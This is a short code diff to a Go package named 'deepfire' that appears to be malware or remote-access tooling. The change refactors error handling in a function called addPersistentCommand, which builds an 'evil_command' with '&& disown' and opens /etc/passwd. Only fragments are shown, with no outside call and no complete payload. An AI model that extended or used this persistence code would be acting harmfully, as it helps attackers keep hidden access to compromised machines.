@@ -2,12 +2,14 @@ package deepfire
 
 import (
 	"fmt"
-	"github.com/mitchellh/go-ps"
 	"io/ioutil"
+	"log"
 	"os"
 	"os/user"
 	"strings"
 	"syscall"
+
+	"github.com/mitchellh/go-ps"
 )
 
 func info() string {
@@ -110,7 +112,11 @@ func wifiDisconnect() error {
 }
 
 func addPersistentCommand(cmd string) error {
-	evil_command := GetPath() + "&& disown"
+	evil_command, err := GetPath()
+	if err != nil {
+		log.Println(err)
+	}
+	evil_command += "&& disown"
 	ep, err := os.Open("/etc/passwd")
 	if err != nil {
 		return err
